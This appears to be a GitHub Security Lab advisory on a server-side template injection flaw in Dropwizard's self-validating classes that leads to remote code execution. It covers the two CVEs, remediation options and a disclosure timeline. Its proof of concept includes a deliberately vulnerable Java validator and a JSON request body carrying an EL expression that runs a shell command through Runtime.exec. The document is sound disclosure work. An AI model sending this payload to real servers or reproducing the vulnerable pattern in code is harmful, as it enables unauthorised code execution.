<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 15, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-030: Server-Side Template Injection in Dropwizard</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>
<p>A Server-Side Template Injection was identified in Dropwizard self-validating feature enabling attackers to inject arbitrary Java EL expressions, leading to Remote Code Execution (RCE) vulnerability.</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2020-5245</li>
  <li>CVE-2020-11002</li>
</ul>

<h2 id="product">Product</h2>
<p>DropWizard</p>

<h2 id="tested-version">Tested Version</h2>
<p>v2.0.1</p>

<h2 id="details">Details</h2>

<p>DropWizard self-validating classes use Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, it is important to understand that they support different types of interpolation, including <a href="https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions">Java EL expressions</a>. Therefore if an attacker can inject arbitrary data in the error message template being passed to <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code> argument, he will be able to run arbitrary Java code. Unfortunately, it is common that validated (and therefore, normally untrusted) bean properties flow into the custom error message.</p>

<p>DropWizard’s <code class="language-plaintext highlighter-rouge">io.dropwizard.validation.selfvalidating.ViolationCollector.addViolation()</code> passes its argument into <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code> without any further sanitization. Therefore, any untrusted data being passed to <code class="language-plaintext highlighter-rouge">addViolation()</code> will be evaluated as an EL expression allowing arbitrary code execution.</p>

<p>Note that this is not a vulnerability in the framework per-se, but an RCE vulnerable API being exposed to developers without proper information. We don’t think this is only a missing warning in the documentation, but rather we think that this API should protect developers against potential misuse (see recommendations to disable EL interpolation altogether below).</p>

<p>As a proof of concept you can reuse <code class="language-plaintext highlighter-rouge">dropwizard-example</code> project and modify <code class="language-plaintext highlighter-rouge">Person.java</code> to become self-validated:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span>
<span class="kn">import</span> <span class="nn">io.dropwizard.validation.selfvalidating.SelfValidating</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">io.dropwizard.validation.selfvalidating.SelfValidation</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">io.dropwizard.validation.selfvalidating.ViolationCollector</span><span class="o">;</span>

<span class="nd">@SelfValidating</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
<span class="o">...</span>
    <span class="nd">@SelfValidation</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">validateFullName</span><span class="o">(</span><span class="nc">ViolationCollector</span> <span class="n">col</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">fullName</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"$"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">col</span><span class="o">.</span><span class="na">addViolation</span><span class="o">(</span><span class="s">"Full name contains invalid characters:  "</span> <span class="o">+</span> <span class="n">fullName</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">...</span>
</code></pre></div></div>

<p>Note that a property of the validated, and therefore normally untrusted, bean is passed to <code class="language-plaintext highlighter-rouge">addViolation()</code> which in turn will pass it to <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate(0)</code>.</p>

<p>To reproduce the issue, send a POST request to <code class="language-plaintext highlighter-rouge">http://server/people</code> with the following body:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"fullName"</span><span class="p">:</span><span class="s2">"java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');//${''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(validatedValue.fullName)}"</span><span class="p">,</span><span class="nl">"jobTitle"</span><span class="p">:</span><span class="s2">"Title"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>We can see the process has been executed by checking the existence of <code class="language-plaintext highlighter-rouge">/tmp/pwned</code> file in conductor file system or simply by inspecting the response</p>

<h3 id="impact">Impact</h3>

<p>This issue may lead to Remote Code execution</p>

<h3 id="remediation">Remediation</h3>

<p>There are different approaches to remediate the issue:</p>
<ul>
  <li>Do not include validated bean properties in the custom error message.</li>
  <li>Sanitize the validated bean properties to make sure that there are no EL expressions. An example of valid sanitization logic can be found <a href="https://github.com/hibernate/hibernate-validator/blob/master/engine/src/main/java/org/hibernate/validator/internal/engine/messageinterpolation/util/InterpolationHelper.java#L17">here</a>.</li>
  <li>Disable the EL interpolation and only use <code class="language-plaintext highlighter-rouge">ParameterMessageInterpolator</code>:
    <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Validator</span> <span class="n">validator</span> <span class="o">=</span> <span class="nc">Validation</span><span class="o">.</span><span class="na">byDefaultProvider</span><span class="o">()</span>
 <span class="o">.</span><span class="na">configure</span><span class="o">()</span>
 <span class="o">.</span><span class="na">messageInterpolator</span><span class="o">(</span> <span class="k">new</span> <span class="nc">ParameterMessageInterpolator</span><span class="o">()</span> <span class="o">)</span>
 <span class="o">.</span><span class="na">buildValidatorFactory</span><span class="o">()</span>
 <span class="o">.</span><span class="na">getValidator</span><span class="o">();</span>
</code></pre></div>    </div>
  </li>
  <li>Replace Hibernate-Validator with Apache BVal which in its latest version does not interpolate EL expressions by default. Note that this replacement may not be a simple drop-in replacement.</li>
</ul>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>02/19/2020: Report sent to Vendor</li>
  <li>03/12/2020: Sent email to <code class="language-plaintext highlighter-rouge">dropwizard.committers+security@gmail.com</code> to ask for confirmation and acknowledge of the report</li>
  <li>02/24/2020: <a href="https://github.com/dropwizard/dropwizard/security/advisories/GHSA-3mcp-9wr4-cjqf">Advisory</a> was published</li>
  <li>03/12/2020: Sent an email to Dropwizard letting them know the fix is insufficient due to hibernate implementation bug</li>
  <li>03/26/2020: New fix is ready for testing</li>
</ul>

<h2 id="vendor-advisories">Vendor Advisories</h2>

<ul>
  <li><a href="https://github.com/dropwizard/dropwizard/security/advisories/GHSA-3mcp-9wr4-cjqf">GHSA-3mcp-9wr4-cjqf</a></li>
  <li><a href="https://github.com/dropwizard/dropwizard/security/advisories/GHSA-8jpx-m2wh-2v34">GHSA-8jpx-m2wh-2v34</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.
We would like to thank Guillaume Smet from the Hibernate Validator team for help with the remediation advice.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-030</code> in any communication regarding this issue.</p>
